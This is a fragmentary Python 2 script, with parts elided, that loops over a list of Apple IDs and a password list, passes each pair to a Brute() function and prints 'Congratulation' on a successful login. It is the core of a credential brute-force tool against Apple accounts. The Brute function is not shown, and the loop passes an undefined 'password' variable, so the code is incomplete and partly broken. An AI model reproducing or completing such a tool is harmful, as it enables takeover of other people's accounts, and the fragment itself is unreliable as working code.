...
with open('mailist.txt', 'r') as file:
	apple_ids = file.read()
	...
	if apple_id:
		...
		for pwd in passwords.split('\n'):
			if pwd:
				...
				try:
					result = Brute(apple_id,password)
					if result == True:
						print 'Congratulation : ', apple_id,password
					if result == 'Bad':
						print 'Sorry : ',apple_id,password
				except:
